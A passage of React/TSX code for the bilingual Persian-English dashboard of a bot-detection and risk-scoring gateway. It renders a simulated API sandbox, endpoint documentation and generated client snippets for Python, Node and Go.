            dec = "BLOCKED";
            scoreDesc = "Automation driver detected inside viewport parameters";
            scoreDescFa = "شناسایی رفتار ترافیک اتوماتیک یا بات‌سایبری";
          } else if (sandboxInputIp === "127.0.0.1") {
            score = 15;
            dec = "APPROVED_BYPASS";
            scoreDesc = "Local loopback access approved";
            scoreDescFa = "دسترسی لوکال شبکه تایید شد";
          } else {
            score = 42;
            dec = "MONITORED";
            scoreDesc = "User profile initialized without hardware confirmation";
            scoreDescFa = "ورود کاربر فاقد تایید دومرحله‌ای کلید فیزیکی";
          }
        }

        setSandboxResponse({
          status: "success",
          requestId: "req_" + Math.random().toString(36).substring(2, 13),
          timestamp: new Date().toISOString(),
          requestedUri: `/api/v1/${sandboxDocEndpoint}`,
          outcome: {
            decision: dec,
            riskScorePercentage: score,
            confidenceMetric: parseFloat((99.9 - (score * 0.3)).toFixed(2)) + "%",
            riskClassification: score > 75 ? "CRITICAL" : score > 35 ? "WARNING" : "STABLE",
          },
          attributesChecked: {
            sourceIp: sandboxInputIp,
            assignedDeviceBrand: sandboxInputDevice,
            hardwareVerification: score > 80 ? "DENIED" : "PASSED",
            diagnosticLog: isRtl ? scoreDescFa : scoreDesc
          }
        });
        setSandboxIsTesting(false);
      }, 1100);
    };

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="border-b border-dash-border/40 pb-4">
          <h2 className="text-xl font-bold text-white flex items-center gap-2">
            <Book className="w-5 h-5 text-indigo-400" />
            {isRtl ? "مستندات تعاملی وب‌سرویس و پنل تست کلاینت‌ها (Sandbox)" : "Interactive REST API Reference & Sandbox"}
          </h2>
          <p className="text-xs text-slate-500 mt-1">
            {isRtl 
              ? "راهنمای اتصال به سیستم امنیت هوشمند و ابزار ارسال تست وب‌سرویس‌ها" 
              : "Read structural API schemas, review payloads, and run live sandbox query drills."}
          </p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Endpoint Docs selector */}
          <div className="lg:col-span-4 space-y-3">
            <h3 className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">
              {isRtl ? "اندپوینت‌های وب‌سرویس فایروال" : "GATEWAY ENDPOINTS REFERENCE"}
            </h3>

            <div
              onClick={() => { setSandboxDocEndpoint("evaluate"); setSandboxResponse(null); }}
              className={cn(
                "p-4 rounded-xl border transition-all cursor-pointer text-right ltr:text-left",
                sandboxDocEndpoint === "evaluate"
                  ? "bg-indigo-600/10 border-indigo-500/50 text-white"
                  : "bg-dash-panel border-dash-border text-slate-400 hover:border-slate-800"
              )}
            >
              <div className="flex items-center gap-2 mb-1">
                <span className="px-1.5 py-0.5 rounded bg-emerald-500/15 text-emerald-400 font-mono text-[9px] font-bold">POST</span>
                <span className="text-xs font-mono font-bold text-slate-200">/api/v1/decision/evaluate</span>
              </div>
              <p className="text-[11px] text-slate-500 leading-normal">
                {isRtl ? "ارزیابی کلی ریسک هویت کلاینت به صورت چند بعدی" : "Performs comprehensive multi-dimensional threat analytics."}
              </p>
            </div>

            <div
              onClick={() => { setSandboxDocEndpoint("verify"); setSandboxResponse(null); }}
              className={cn(
                "p-4 rounded-xl border transition-all cursor-pointer text-right ltr:text-left",
                sandboxDocEndpoint === "verify"
                  ? "bg-indigo-600/10 border-indigo-500/50 text-white"
                  : "bg-dash-panel border-dash-border text-slate-400 hover:border-slate-800"
              )}
            >
              <div className="flex items-center gap-2 mb-1">
                <span className="px-1.5 py-0.5 rounded bg-emerald-500/15 text-emerald-400 font-mono text-[9px] font-bold">POST</span>
                <span className="text-xs font-mono font-bold text-slate-200">/api/v1/fingerprint/verify</span>
              </div>
              <p className="text-[11px] text-slate-500 leading-normal">
                {isRtl ? "ثبت و تایید اعتبارسنجی الگوریتم‌های سخت‌افزاری مرورگر" : "Stores canvas patterns cryptographic hashes mapping devices."}
              </p>
            </div>

            <div
              onClick={() => { setSandboxDocEndpoint("ip-check"); setSandboxResponse(null); }}
              className={cn(
                "p-4 rounded-xl border transition-all cursor-pointer text-right ltr:text-left",
                sandboxDocEndpoint === "ip-check"
                  ? "bg-indigo-600/10 border-indigo-500/50 text-white"
                  : "bg-dash-panel border-dash-border text-slate-400 hover:border-slate-800"
              )}
            >
              <div className="flex items-center gap-2 mb-1">
                <span className="px-1.5 py-0.5 rounded bg-indigo-500/15 text-indigo-400 font-mono text-[9px] font-bold">GET</span>
                <span className="text-xs font-mono font-bold text-slate-200">/api/v1/threat/ip-check</span>
              </div>
              <p className="text-[11px] text-slate-500 leading-normal">
                {isRtl ? "استعلام سریع آدرس آی‌پی در مخزن اطلاعات تهدیدات سایبری" : "Instant ASN routing audit, proxy validation, and geo query."}
              </p>
            </div>
          </div>

          {/* Docs center content & sandbox tool */}
          <div className="lg:col-span-8 space-y-6">
            {/* Header schema overview */}
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
              <h3 className="text-sm font-semibold text-slate-200">
                {isRtl ? "ساختار هدرهای درخواست" : "Required Authorization Headers"}
              </h3>
              <div className="p-3 bg-slate-950 border border-slate-900 rounded-lg font-mono text-[11px] text-indigo-300 space-y-1" dir="ltr text-left">
                <div>Authorization: Bearer sk_live_your_secret_token_here</div>
                <div>Content-Type: application/json</div>
              </div>

              <div className="text-xs text-slate-400 space-y-2">
                <div className="font-bold text-slate-300">{isRtl ? "مشخصات بارگذاری پارامترها" : "JSON Parameters Rules"}</div>
                {sandboxDocEndpoint === "evaluate" && (
                  <ul className="list-disc leading-relaxed ltr:pl-5 rtl:pr-5 text-slate-500 space-y-1 text-[11px]">
                    <li><code className="text-slate-300">ip</code> (string - {isRtl ? "اجباری" : "Required"}) - {isRtl ? "آدرس آی‌پی کلاینت مبدا" : "Target client source IPv4 or IPv6"}</li>
                    <li><code className="text-slate-300">userAgent</code> (string - {isRtl ? "اختیاری" : "Optional"}) - {isRtl ? "آرگومان هدر مرورگر کلاینت" : "Platform browser profile configuration string"}</li>
                    <li><code className="text-slate-300">behaviorPayload</code> (object - {isRtl ? "اختیاری" : "Optional"}) - {isRtl ? "الگوهای ضرب دکمه و پرواز کلید" : "CPM keystrokes data packets"}</li>
                  </ul>
                )}
                {sandboxDocEndpoint === "verify" && (
                  <ul className="list-disc leading-relaxed ltr:pl-5 rtl:pr-5 text-slate-500 space-y-1 text-[11px]">
                    <li><code className="text-slate-300">canvasHash</code> (string - {isRtl ? "اجباری" : "Required"}) - {isRtl ? "امضای طراحی دو بعدی مرورگر" : "Unique device specific chromium canvas render tag"}</li>
                    <li><code className="text-slate-300">webglRenderer</code> (string - {isRtl ? "اختیاری" : "Optional"}) - {isRtl ? "کارت حافظه گرافیکی" : "Hardware graphic engine pipeline identifier"}</li>
                  </ul>
                )}
                {sandboxDocEndpoint === "ip-check" && (
                  <ul className="list-disc leading-relaxed ltr:pl-5 rtl:pr-5 text-slate-500 space-y-1 text-[11px]">
                    <li><code className="text-slate-300">ip_address</code> (query parameter) - {isRtl ? "آدرس آی‌پی برای چک سایبری" : "The targeted IPv4/v6 endpoint inside routing records"}</li>
                  </ul>
                )}
              </div>
            </div>

            {/* Simulated Live Sandbox client */}
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
              <h3 className="text-sm font-semibold text-slate-200 flex items-center gap-2">
                <Terminal className="w-4 h-4 text-indigo-400" />
                {isRtl ? "تست لایو درخواست (Sandbox Playground)" : "Live Sandbox Gateway client Simulator"}
              </h3>

              <form onSubmit={handleRunSandboxQuery} className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="space-y-1">
                  <label className="text-[10px] text-slate-500 uppercase font-mono block">{isRtl ? "آدرس آی‌پی تست" : "Test target IP Address"}</label>
                  <input
                    type="text"
                    value={sandboxInputIp}
                    onChange={(e) => setSandboxInputIp(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-100 font-mono focus:outline-none focus:border-indigo-500"
                  />
                </div>

                <div className="space-y-1">
                  <label className="text-[10px] text-slate-500 uppercase font-mono block">{isRtl ? "نام دستگاه / یوزر ایجنت" : "User Agent Platform details"}</label>
                  <input
                    type="text"
                    value={sandboxInputDevice}
                    onChange={(e) => setSandboxInputDevice(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-100 focus:outline-none focus:border-indigo-500"
                  />
                </div>

                <div className="sm:col-span-2">
                  <button
                    type="submit"
                    disabled={sandboxIsTesting}
                    className="w-full py-2.5 bg-indigo-600 hover:bg-indigo-500 text-white font-bold text-xs uppercase tracking-wider rounded-lg transition-all shadow-[0_0_12px_rgba(79,70,229,0.4)] flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-50"
                  >
                    {sandboxIsTesting ? (
                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    ) : (
                      <Play className="w-3.5 h-3.5" />
                    )}
                    {isRtl ? "ارسال درخواست تست به گیت‌وی" : "DISPATCH SIMULATION ARTIFACT REQUEST"}
                  </button>
                </div>
              </form>

              {/* Response Code output */}
              {(sandboxIsTesting || sandboxResponse) && (
                <div className="space-y-2 pt-2">
                  <div className="flex justify-between items-center">
                    <span className="text-[10px] text-slate-500 uppercase font-mono">{isRtl ? "خروجی درخواست (JSON Response)" : "Live Return Header Payload"}</span>
                    {sandboxResponse && (
                      <span className={cn(
                        "px-1.5 py-0.5 rounded text-[9px] font-bold font-mono",
                        sandboxResponse.outcome.riskClassification === "CRITICAL" ? "bg-rose-500/15 text-rose-400" :
                        sandboxResponse.outcome.riskClassification === "WARNING" ? "bg-amber-500/15 text-amber-400" : "bg-emerald-500/15 text-emerald-400"
                      )}>
                        {sandboxResponse.outcome.decision} (RISK: {sandboxResponse.outcome.riskScorePercentage}%)
                      </span>
                    )}
                  </div>

                  <div className="bg-slate-950 border border-slate-900 rounded-xl p-4 overflow-x-auto select-all max-h-72 custom-scrollbar">
                    {sandboxIsTesting ? (
                      <div className="text-slate-500 font-mono text-xs flex items-center gap-2 py-4">
                        <span className="w-2 h-2 rounded-full bg-indigo-500 animate-ping" />
                        <span>{isRtl ? "درحال ارسال بسته، رمزنگاری کدهای SSL، محاسبه توابع هوش رفتاری..." : "Establishing TLSv1.3 tunnel, computing mouse and canvas vectors, evaluating entropy..."}</span>
                      </div>
                    ) : (
                      <pre className="text-[11px] font-mono text-indigo-400 leading-relaxed text-left ltr:text-left rtl:text-left" dir="ltr">
                        {JSON.stringify(sandboxResponse, null, 2)}
                      </pre>
                    )}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* --- DYNAMIC INTEGRATION GUIDE SECTION --- */}
        <div id="dynamic-integration-guide" className="bg-dash-panel border border-dash-border rounded-xl p-5 md:p-6 space-y-6 mt-8">
          <div className="border-b border-dash-border/40 pb-4 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
            <div>
              <h3 className="text-lg font-bold text-white flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-emerald-400" />
                {isRtl ? "راهنمای هوشمند یکپارچه‌سازی وب‌سرویس‌ها" : "Dynamic API Integration Guide"}
              </h3>
              <p className="text-xs text-slate-500 mt-1">
                {isRtl 
                  ? "تولید خودکار کدهای آماده و پکیج‌های توسعه کلاینت متناسب با الگوهای امنیتی انتخاب شده" 
                  : "Auto-compile client boilerplate, security schemas, validation rules, and context definitions in real-time."}
              </p>
            </div>
            
            <div className="flex items-center gap-2">
              <span className="inline-flex h-2 w-2 rounded-full bg-emerald-500 animate-ping" />
              <span className="text-[10px] text-emerald-400 font-mono tracking-wider bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20 uppercase">
                {isRtl ? "تولید لحظه‌ای" : "LIVE SDK BUILDS"}
              </span>
            </div>
          </div>

          {/* Guide Selector Controls */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 bg-slate-950/60 p-4 rounded-xl border border-slate-900">
            {/* 1. Endpoint interface */}
            <div className="space-y-1.5">
              <label className="text-[10px] text-slate-500 uppercase font-mono block">
                {isRtl ? "اندپوینت هدف" : "Target API Endpoint"}
              </label>
              <select
                value={guideSelectedEndpoint}
                onChange={(e) => {
                  setGuideSelectedEndpoint(e.target.value);
                  setGuideSuccessMsg(isRtl ? "اندپوینت به‌روزرسانی شد!" : "Endpoint configuration compiled!");
                  setTimeout(() => setGuideSuccessMsg(""), 2000);
                }}
                className="w-full bg-slate-900 border border-slate-800 text-slate-200 rounded-lg px-3 py-2 text-xs focus:outline-none focus:border-indigo-500"
              >
                <option value="evaluate">/api/v1/decision/evaluate</option>
                <option value="verify">/api/v1/fingerprint/verify</option>
                <option value="ip-check">/api/v1/threat/ip-check</option>
              </select>
            </div>

            {/* 2. Target SDK Runtime */}
            <div className="space-y-1.5">
              <label className="text-[10px] text-slate-500 uppercase font-mono block">
                {isRtl ? "زبان توسعه کلاینت" : "Target SDK Runtime"}
              </label>
              <select
                value={guideSelectedSdk}
                onChange={(e) => {
                  setGuideSelectedSdk(e.target.value);
                  setGuideSuccessMsg(isRtl ? "کیت توسعه زبان جدید تولید شد!" : "Target SDK blueprints compiled!");
                  setTimeout(() => setGuideSuccessMsg(""), 2000);
                }}
                className="w-full bg-slate-900 border border-slate-800 text-slate-400 rounded-lg px-3 py-2 text-xs focus:outline-none focus:border-indigo-500 font-mono font-bold"
              >
                <option value="python">Python 3.x SDK</option>
                <option value="node">Node.JS / TS Client</option>
                <option value="go">Go (Golang) SDK</option>
              </select>
            </div>

            {/* 3. Security Strictness Level */}
            <div className="space-y-1.5">
              <label className="text-[10px] text-slate-500 uppercase font-mono block">
                {isRtl ? "سطح سخت‌گیری" : "Strictness Profile"}
              </label>
              <select
                value={guideSecurityStrictness}
                onChange={(e) => {
                  setGuideSecurityStrictness(e.target.value);
                  setGuideSuccessMsg(isRtl ? "سناریو فایروال تغییر یافت!" : "Firewall threshold profiles rebuilt!");
                  setTimeout(() => setGuideSuccessMsg(""), 2000);
                }}
                className="w-full bg-slate-900 border border-slate-800 text-slate-200 rounded-lg px-3 py-2 text-xs focus:outline-none focus:border-indigo-500"
              >
                <option value="permissive">{isRtl ? "پذیرنده ملایم (Fail-Open)" : "Permissive Mode (Fail-Open)"}</option>
                <option value="balanced">{isRtl ? "استاندارد متعادل" : "Standard Balanced Profile"}</option>
                <option value="zero-trust">{isRtl ? "امنیتی سخت‌گیرانه (Zero-Trust)" : "Zero-Trust (Fail-Closed)"}</option>
              </select>
            </div>

            {/* 4. Credentials Auth Protocol */}
            <div className="space-y-1.5">
              <label className="text-[10px] text-slate-500 uppercase font-mono block">
                {isRtl ? "بستر احراز گیت‌وی" : "Authorization Type"}
              </label>
              <select
                value={guideAuthMethod}
                onChange={(e) => {
                  setGuideAuthMethod(e.target.value);
                  setGuideSuccessMsg(isRtl ? "متد احراز هویت تنظیم شد!" : "Secure handshake method applied!");
                  setTimeout(() => setGuideSuccessMsg(""), 2000);
                }}
                className="w-full bg-slate-900 border border-slate-800 text-slate-200 rounded-lg px-3 py-2 text-xs focus:outline-none focus:border-indigo-500"
              >
                <option value="bearer">{isRtl ? "توکن حامل (sk_live_*)" : "Standard Bearer API Key"}</option>
                <option value="crypto_signature">{isRtl ? "امضای رمزنگاری همزمان" : "Crypto Signature Validation"}</option>
              </select>
            </div>
          </div>

          {/* Feedback notification toast */}
          {guideSuccessMsg && (
            <div className="p-2.5 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-lg text-xs font-semibold flex items-center gap-2 select-none justify-center animate-pulse">
              <Check className="w-3.5 h-3.5" />
              {guideSuccessMsg}
            </div>
          )}

          {/* Two-column layout: Dynamic Steps vs Dynamic Playground JSON & Code Block */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Left Column: Localized Multi-step Integration Timeline */}
            <div className="lg:col-span-5 space-y-4">
              <h4 className="text-xs font-bold text-slate-400 uppercase tracking-widest block mb-1">
                {isRtl ? "مراحل گام‌به‌گام پیاده‌سازی وب‌سرویس" : "Step-by-Step Security Timeline"}
              </h4>

              <div className="space-y-4">
                {/* Step 1 */}
                <div className="bg-slate-950/40 p-4 rounded-xl border border-dash-border/60 relative hover:border-indigo-500/30 transition-all">
                  <div className="absolute top-4 left-4 ltr:right-4 rtl:left-4 bg-indigo-600/10 text-indigo-400 font-mono text-[10px] font-bold px-2 py-0.5 rounded-full border border-indigo-500/20">
                    STEP 01
                  </div>
                  <h5 className="text-xs font-bold text-slate-200 mb-2">
                    {isRtl ? "پیکربندی اعتبارنامه‌ها و ایمنی کلید" : "Credentials & Environment Config"}
                  </h5>
                  <p className="text-[11px] text-slate-400 leading-normal mb-3">
                    {isRtl 
                      ? `شناسه صادر شده (با روش احراز هویت ${guideAuthMethod === "bearer" ? "توکن حامل Bearer" : "امضای دیجیتال تفاضلی"}) را در متغیرهای پایه‌ای لود کرده و به آدرس اصلی فایروال سایبری متصل کنید.`
                      : `Initialize user-level secure secrets. Using the chosen "${guideAuthMethod}" mechanism, configure variables to address the high-throughput firewall gateway.`
                    }
                  </p>
                  <div className="p-2 bg-slate-950 rounded font-mono text-[10px] text-slate-500 border border-slate-900">
                    {guideAuthMethod === "bearer" 
                      ? "Authorization: Bearer sk_live_your_passkey" 
                      : "X-Passport-Signature: sha256_hash_signature"
                    }
                  </div>
                </div>

                {/* Step 2 */}
                <div className="bg-slate-950/40 p-4 rounded-xl border border-dash-border/60 relative hover:border-indigo-500/30 transition-all">
                  <div className="absolute top-4 left-4 ltr:right-4 rtl:left-4 bg-indigo-600/10 text-indigo-400 font-mono text-[10px] font-bold px-2 py-0.5 rounded-full border border-indigo-500/20">
                    STEP 02
                  </div>
                  <h5 className="text-xs font-bold text-slate-200 mb-2">
                    {isRtl ? "بدنه استاندارد پارامترهای بسته" : "Schema Validation Rules"}
                  </h5>
                  <p className="text-[11px] text-slate-400 leading-normal mb-3">
                    {isRtl 
                      ? `ارسال فیلدهای اختصاصی متناسب با اندپوینت ${guideSelectedEndpoint === "evaluate" ? "ارزیابی ریسک هوشمند" : guideSelectedEndpoint === "verify" ? "تایید هویت سخت‌افزاری" : "پایش موقعیت آی‌پی"}.`
                      : `The generated layout demands real-time input validation for "${guideSelectedEndpoint === "evaluate" ? "Multi-layered Smart Risk" : guideSelectedEndpoint === "verify" ? "Hardware Canvas hash" : "ASN Intelligence Proxy"}" fields.`
                    }
                  </p>
                  <ul className="text-[10px] text-slate-500 font-mono space-y-1 rtl:pr-4 ltr:pl-4 list-disc">
                    <li>endpoint: "/api/v1/{guideSelectedEndpoint === "evaluate" ? "decision/evaluate" : guideSelectedEndpoint === "verify" ? "fingerprint/verify" : "threat/ip-check"}"</li>
                    <li>strictness: "{guideSecurityStrictness}"</li>
                    <li>fail_policy: "{guideSecurityStrictness === "zero-trust" ? "closed_strict" : "open_permissive"}"</li>
                  </ul>
                </div>

                {/* Step 3 */}
                <div className="bg-slate-950/40 p-4 rounded-xl border border-dash-border/60 relative hover:border-indigo-500/30 transition-all">
                  <div className="absolute top-4 left-4 ltr:right-4 rtl:left-4 bg-indigo-600/10 text-indigo-400 font-mono text-[10px] font-bold px-2 py-0.5 rounded-full border border-indigo-500/20">
                    STEP 03
                  </div>
                  <h5 className="text-xs font-bold text-slate-200 mb-2">
                    {isRtl ? "کنترل پویای زمان پاسخ و خطا (Fail-Open/Closed)" : "Interceptor & Threat Actions"}
                  </h5>
                  <p className="text-[11px] text-slate-400 leading-normal">
                    {isRtl 
                      ? `سیاست خطای انتخابی شما کاربر را در شرایط بحرانی با سیاست ${guideSecurityStrictness === "zero-trust" ? "انسداد صفر سیستم (Zero-Trust)" : "باز نگهداشتن سیستم (Fail-Open)"} مدیریت می‌کند تا پایداری سایت تضمین شود.`
                      : `Timed interceptor set to fail-${guideSecurityStrictness === "zero-trust" ? "CLOSED (high security strictness limits)" : "OPEN (permissive performance model)"}. Suspicious patterns trigger immediate status challenges.`
                    }
                  </p>
                </div>
              </div>
            </div>

            {/* Right Column: Code viewer & Live Generated Config spec JSON */}
            <div className="lg:col-span-7 space-y-6">
              {/* SDK Generated Source code */}
              <div className="bg-slate-950 border border-slate-900 rounded-xl p-4 md:p-5 relative">
                <div className="border-b border-dash-border/30 pb-3 flex justify-between items-center mb-4">
                  <span className="text-[10px] text-slate-400 font-mono uppercase tracking-widest">
                    {guideSelectedSdk === "python" ? "main.py" : guideSelectedSdk === "node" ? "middleware.ts" : "main.go"} (Generated Code)
                  </span>
                  <button
                    onClick={() => {
                      const codeSnippet = (() => {
                        const timeoutVal = guideSecurityStrictness === "zero-trust" ? 2500 : guideSecurityStrictness === "balanced" ? 800 : 300;
                        const failOpenVal = guideSecurityStrictness === "zero-trust" ? "false" : "true";
                        const path = guideSelectedEndpoint === "evaluate" ? "/api/v1/decision/evaluate" : guideSelectedEndpoint === "verify" ? "/api/v1/fingerprint/verify" : "/api/v1/threat/ip-check";
                        
                        if (guideSelectedSdk === "python") {
                          return `# Passport Cybershield - Active Security Integration Guide\nimport passport_security as shield\n\n# Configuration set to "${guideSecurityStrictness}" security strictness\nconfig = shield.Config(\n    api_key="sk_live_your_secret_token_here",\n    auth_mode="${guideAuthMethod}",\n    timeout_ms=${timeoutVal},\n    fail_open=${guideSecurityStrictness === "zero-trust" ? "False" : "True"}\n)\n\nclient = shield.Client(config)\n\ndef handle_request(ip, metadata):\n    try:\n        # Programmatic Endpoint Query: ${path}\n        response = client.call(\n            endpoint="${guideSelectedEndpoint}",\n            payload={\n                "ip": ip,\n                "profile": metadata,\n                "strictness": "${guideSecurityStrictness}"\n            }\n        )\n        if response.decision == "BLOCKED":\n            return {"allow": False, "code": 403, "reason": "Cybershield Enforcement"}\n        return {"allow": True, "auth_level": response.clearance}\n        \n    except shield.TimeoutException:\n        # Applying Dynamic Fail Policy: Fail-${guideSecurityStrictness === "zero-trust" ? "CLOSED (Strict)" : "OPEN (Permissive)"}\n        return {"allow": ${guideSecurityStrictness === "zero-trust" ? "False" : "True"}, "reason": "Network Timeout"}`;
                        } else if (guideSelectedSdk === "node") {
                          return `// Passport Cybershield - Active Security Integration Guide JS/TS\nimport { SecurityClient } from '@passport/security-client';\n\nconst client = new SecurityClient({\n  apiKey: process.env.PASSPORT_SECRET_KEY,\n  authMethod: "${guideAuthMethod}",\n  timeoutMs: ${timeoutVal},\n  failOpen: ${failOpenVal}\n});\n\nexport async function processTraffic(req, res, next) {\n  try {\n    // Dynamic Programmatic Call: ${path}\n    const result = await client.verify("${guideSelectedEndpoint}", {\n      ip: req.ip,\n      headers: req.headers,\n      protectionProfile: "${guideSecurityStrictness}"\n    });\n\n    if (result.outcome.decision === 'BLOCKED') {\n      return res.status(403).json({ error: 'Blocked by Cybershield Policy' });\n    }\n    next();\n  } catch (err) {\n    // Timeout Enforcement: Fail ${guideSecurityStrictness === "zero-trust" ? "Closed (Zero-Trust enabled)" : "Open (Permissive fallback)"}\n    if (config.failOpen) {\n      return next();\n    }\n    res.status(403).json({ error: 'Gateway unavailable under dynamic zero-trust settings' });\n  }\n}`;
                        } else {
                          return `// Passport Cybershield - Active Security Integration Guide\npackage main\n\nimport (\n    "context"\n    "fmt"\n    "github.com/passport-security/sdk-go"\n)\n\nfunc VerifyClientRequest(ip string, payload interface{}) bool {\n    client := passport.NewClient("sk_live_token_here")\n    client.SetStrictness("${guideSecurityStrictness}")\n    client.SetAuthMethod("${guideAuthMethod}")\n    client.SetFailOpen(${failOpenVal})\n\n    // Programmatic Endpoint Path: ${path}\n    ctx := context.Background()\n    result, err := client.Execute(ctx, "${guideSelectedEndpoint}", payload)\n    if err != nil {\n        // Fail Policy fallback: ${guideSecurityStrictness === "zero-trust" ? "CLOSED (Strict)" : "OPEN (Permissive)"}\n        return ${guideSecurityStrictness === "zero-trust" ? "false" : "true"}\n    }\n\n    return result.Allowed\n}`;
                        }
                      })();
                      navigator.clipboard.writeText(codeSnippet);
                      setGuideSuccessMsg(isRtl ? "کد امنیتی کپی شد!" : "Integration source code copied to clipboard!");
                      setTimeout(() => setGuideSuccessMsg(""), 3000);
                    }}
                    className="px-2.5 py-1 rounded bg-indigo-600 hover:bg-indigo-500 text-white font-mono text-[9px] font-bold cursor-pointer transition-all uppercase"
                  >
                    {isRtl ? "کپی کد نمونه" : "COPY ACTION BLOCKS"}
                  </button>
                </div>

                <div className="overflow-x-auto text-[11px] font-mono leading-relaxed text-indigo-400 h-64 select-text">
                  <pre className="text-left ltr:text-left rtl:text-left" dir="ltr">
                    {(() => {
                      const timeoutVal = guideSecurityStrictness === "zero-trust" ? 2500 : guideSecurityStrictness === "balanced" ? 800 : 300;
                      const failOpenVal = guideSecurityStrictness === "zero-trust" ? "false" : "true";
                      const path = guideSelectedEndpoint === "evaluate" ? "/api/v1/decision/evaluate" : guideSelectedEndpoint === "verify" ? "/api/v1/fingerprint/verify" : "/api/v1/threat/ip-check";
                      
                      if (guideSelectedSdk === "python") {
                        return `# Passport Cybershield - Active Security Integration Guide\nimport passport_security as shield\n\n# Configuration set to "${guideSecurityStrictness}" security strictness\nconfig = shield.Config(\n    api_key="sk_live_your_secret_token_here",\n    auth_mode="${guideAuthMethod}",\n    timeout_ms=${timeoutVal},\n    fail_open=${guideSecurityStrictness === "zero-trust" ? "False" : "True"}\n)\n\nclient = shield.Client(config)\n\ndef handle_request(ip, metadata):\n    try:\n        # Programmatic Endpoint Query: ${path}\n        response = client.call(\n            endpoint="${guideSelectedEndpoint}",\n            payload={\n                "ip": ip,\n                "profile": metadata,\n                "strictness": "${guideSecurityStrictness}"\n            }\n        )\n        if response.decision == "BLOCKED":\n            return {"allow": False, "code": 403, "reason": "Cybershield Enforcement"}\n        return {"allow": True, "auth_level": response.clearance}\n        \n    except shield.TimeoutException:\n        # Applying Dynamic Fail Policy: Fail-${guideSecurityStrictness === "zero-trust" ? "CLOSED (Strict)" : "OPEN (Permissive)"}\n        return {"allow": ${guideSecurityStrictness === "zero-trust" ? "False" : "True"}, "reason": "Network Timeout"}`;
                      } else if (guideSelectedSdk === "node") {
                        return `// Passport Cybershield - Active Security Integration Guide JS/TS\nimport { SecurityClient } from '@passport/security-client';\n\nconst client = new SecurityClient({\n  apiKey: process.env.PASSPORT_SECRET_KEY,\n  authMethod: "${guideAuthMethod}",\n  timeoutMs: ${timeoutVal},\n  failOpen: ${failOpenVal}\n});\n\nexport async function processTraffic(req, res, next) {\n  try {\n    // Dynamic Programmatic Call: ${path}\n    const result = await client.verify("${guideSelectedEndpoint}", {\n      ip: req.ip,\n      headers: req.headers,\n      protectionProfile: "${guideSecurityStrictness}"\n    });\n\n    if (result.outcome.decision === 'BLOCKED') {\n      return res.status(403).json({ error: 'Blocked by Cybershield Policy' });\n    }\n    next();\n  } catch (err) {\n    // Timeout Enforcement: Fail ${guideSecurityStrictness === "zero-trust" ? "Closed (Zero-Trust enabled)" : "Open (Permissive fallback)"}\n    if (config.failOpen) {\n      return next();\n    }\n    res.status(403).json({ error: 'Gateway unavailable under dynamic zero-trust settings' });\n  } \n}`;
                      } else {
                        return `// Passport Cybershield - Active Security Integration Guide\npackage main\n\nimport (\n    "context"\n    "fmt"\n    "github.com/passport-security/sdk-go"\n)\n\nfunc VerifyClientRequest(ip string, payload interface{}) bool {\n    client := passport.NewClient("sk_live_token_here")\n    client.SetStrictness("${guideSecurityStrictness}")\n    client.SetAuthMethod("${guideAuthMethod}")\n    client.SetFailOpen(${failOpenVal})\n\n    // Programmatic Endpoint Path: ${path}\n    ctx := context.Background()\n    result, err := client.Execute(ctx, "${guideSelectedEndpoint}", payload)\n    if err != nil {\n        // Fail Policy fallback: ${guideSecurityStrictness === "zero-trust" ? "CLOSED (Strict)" : "OPEN (Permissive)"}\n        return ${guideSecurityStrictness === "zero-trust" ? "false" : "true"}\n    }\n\n    return result.Allowed\n}`;
                      }
                    })()}
                  </pre>
                </div>
              </div>

              {/* Dynamic JSON Schema output */}
              <div className="bg-slate-950/50 p-4 rounded-xl border border-dash-border/60 space-y-3">
                <div className="flex justify-between items-center text-xs">
                  <span className="font-bold text-slate-350 flex items-center gap-1.5">
                    <Database className="w-4 h-4 text-indigo-400" />
                    {isRtl ? "سند خودکار مشخصات ریسک (JSON Spec)" : "Auto-Generated Schema Spec (JSON)"}
                  </span>
                  
                  <button
                    onClick={() => {
                      const spec = {
                        schema_version: "2.4.0",
                        target_endpoint: guideSelectedEndpoint === "evaluate" ? "/api/v1/decision/evaluate" : guideSelectedEndpoint === "verify" ? "/api/v1/fingerprint/verify" : "/api/v1/threat/ip-check",
                        strictness_profile: guideSecurityStrictness,
                        handshake_auth: guideAuthMethod,
                        policy_enforcement: {
                          fail_open: guideSecurityStrictness !== "zero-trust",
                          gateway_timeout_limit: guideSecurityStrictness === "zero-trust" ? 2500 : guideSecurityStrictness === "balanced" ? 800 : 300,
                          allow_heuristics_fallback: guideSecurityStrictness === "permissive",
                          require_certified_secure_path: guideSecurityStrictness === "zero-trust"
                        },
                        payload_signature_requirement: guideAuthMethod === "crypto_signature" ? "HMAC-SHA256" : "Standard API Key Header"
                      };
                      navigator.clipboard.writeText(JSON.stringify(spec, null, 2));
                      setGuideSuccessMsg(isRtl ? "فرمت JSON کپی شد!" : "Dynamic JSON Schema Schema copied!");
                      setTimeout(() => setGuideSuccessMsg(""), 3000);
                    }}
                    className="text-[10px] text-slate-500 hover:text-slate-300 font-mono underline cursor-pointer"
                  >
                    {isRtl ? "کپی مشخصات ریسک" : "Copy Schema Model"}
                  </button>
                </div>
                
                <pre className="text-[10px] font-mono text-indigo-400 leading-normal bg-slate-950 p-3 rounded-lg border border-slate-900 select-all select-text overflow-x-auto text-left ltr:text-left rtl:text-left" dir="ltr">
